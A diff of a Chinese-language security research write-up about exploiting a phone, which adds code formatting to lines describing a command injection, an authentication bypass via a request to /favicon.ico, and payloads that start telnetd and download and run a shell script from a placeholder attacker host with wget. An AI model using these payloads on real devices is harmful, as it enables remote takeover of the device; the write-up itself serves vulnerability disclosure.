@@ -116,7 +116,7 @@ Password:
   
 所以我们的新命令注入变成了以下内容  
   
-&telnetd;cd /tmp;wget <attackerip>/s.sh;chmod +x ./s.sh;./s.sh;rm s.sh;  
+`&telnetd;cd /tmp;wget <attackerip>/s.sh;chmod +x ./s.sh;./s.sh;rm s.sh;`  
   
 要获取/字符，您需要按5次1按钮。是的，这个有效载荷在电话键盘上输入需要很长时间。  
   
@@ -246,7 +246,7 @@ undefined4 checkFileEndings(char *path)
 这为我们提供了多种可用于会话续订的路由。我们选择了/favicon.ico。  
   
 所以我们的认证绕过现在由以下步骤组成：  
-1. 向http://<phone>/favicon.ico发送一个GET请求  
+1. 向`http://<phone>/favicon.ico`发送一个GET请求  
   
 1. 向任意端点发送一个未经认证的POST请求  
   
@@ -510,7 +510,7 @@ ffmpeg -i input.mp3 -acodec pcm_s16le -ar 16000 -ac 1 output.wav
   
 1. 负载将下载一张图片和一首歌并在设备上播放  
   
-进入system的最终调用如下：wget <attacker>/p.sh;chmod +x ./p.sh;./p.sh;rm p.sh。  
+进入system的最终调用如下：`wget <attacker>/p.sh;chmod +x ./p.sh;./p.sh;rm p.sh`。  
   
 注意：音量可能有点大（是的，屏幕上还在背景中弹出各种Windows计算器的窗口）  
   
